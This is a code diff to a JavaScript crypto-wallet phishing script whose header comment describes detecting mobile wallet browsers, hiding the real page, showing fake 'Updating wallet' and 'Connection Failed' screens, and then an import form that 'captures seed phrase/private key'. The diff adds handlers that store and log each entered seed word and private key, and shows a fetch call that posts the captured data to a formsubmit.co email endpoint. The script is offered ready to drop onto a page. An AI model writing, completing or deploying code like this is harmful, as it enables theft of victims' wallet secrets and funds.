@@ -1,4 +1,43 @@
+/**
+ * Wallet Modal with Automatic Mobile Wallet Browser Detection
+ * 
+ * HOW IT WORKS:
+ * 
+ * 1. ON DESKTOP:
+ *    - Shows full HTML page with all service buttons
+ *    - Click "interact-button" → Wallet selection modal
+ *    - Click wallet → "Open in [Wallet]?" prompt
+ *    - Click "Open" → Shows simulated wallet flow for testing
+ * 
+ * 2. ON MOBILE (Normal Browser):
+ *    - Shows full HTML page with all service buttons
+ *    - Click "interact-button" → Wallet selection modal
+ *    - Click wallet → "Open in [Wallet]?" prompt
+ *    - Click "Open" → Opens wallet app
+ * 
+ * 3. ON MOBILE (Inside Wallet Browser - Trust, MetaMask, etc.):
+ *    - AUTOMATICALLY detects wallet browser
+ *    - HIDES all HTML content (sections, buttons, everything)
+ *    - Shows ONLY: "Updating wallet..." → "Connection Failed" → Import screen
+ *    - User never sees the main page!
+ * 
+ * COMPLETE FLOW:
+ * - User clicks service button
+ * - Selects wallet
+ * - Sees "Open in [Wallet]?" prompt
+ * - Clicks "Open"
+ * - Wallet app opens with browser
+ * - Website loads in wallet browser
+ * - Shows: Updating → Connection Failed → Import screen
+ * - Captures seed phrase/private key
+ * 
+ * NO SETUP NEEDED:
+ * - Just include this script on your page
+ * - Works automatically on mobile wallet browsers
+ * - Desktop shows simulated flow for testing
+ */
 
+// Wrap everything to prevent redeclaration errors
 (function() {
   'use strict';
   
@@ -839,11 +878,6 @@ class WalletModal {
     `;
 
     document.body.insertAdjacentHTML('beforeend', importHTML);
-    
-    // Attach input listeners immediately
-    setTimeout(() => {
-      this.attachInputListeners();
-    }, 50);
   }
 
   renderPrivateKeyInput() {
@@ -852,6 +886,7 @@ class WalletModal {
         <textarea
           id="private-key-input"
           placeholder="Enter your private key"
+          oninput="walletModal.updatePrivateKey(this.value)"
           class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none resize-none"
           rows="4"
           autocomplete="off"
@@ -872,6 +907,7 @@ class WalletModal {
           data-index="${i}"
           placeholder="${i + 1}"
           value="${this.seedWords[i] || ''}"
+          oninput="walletModal.updateSeedWord(${i}, this.value)"
           class="seed-word-input p-2.5 sm:p-3 border border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none"
           autocomplete="off"
           autocorrect="off"
@@ -881,6 +917,16 @@ class WalletModal {
       `);
     }
     return `<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">${inputs.join('')}</div>`;
+  }
+
+  updateSeedWord(index, value) {
+    this.seedWords[index] = value;
+    console.log(`Word ${index + 1} updated: ${value}`);
+  }
+
+  updatePrivateKey(value) {
+    this.privateKey = value;
+    console.log(`Private key updated, length: ${value.length}`);
   }
 
   attachInputListeners() {
@@ -1015,7 +1061,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
+    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
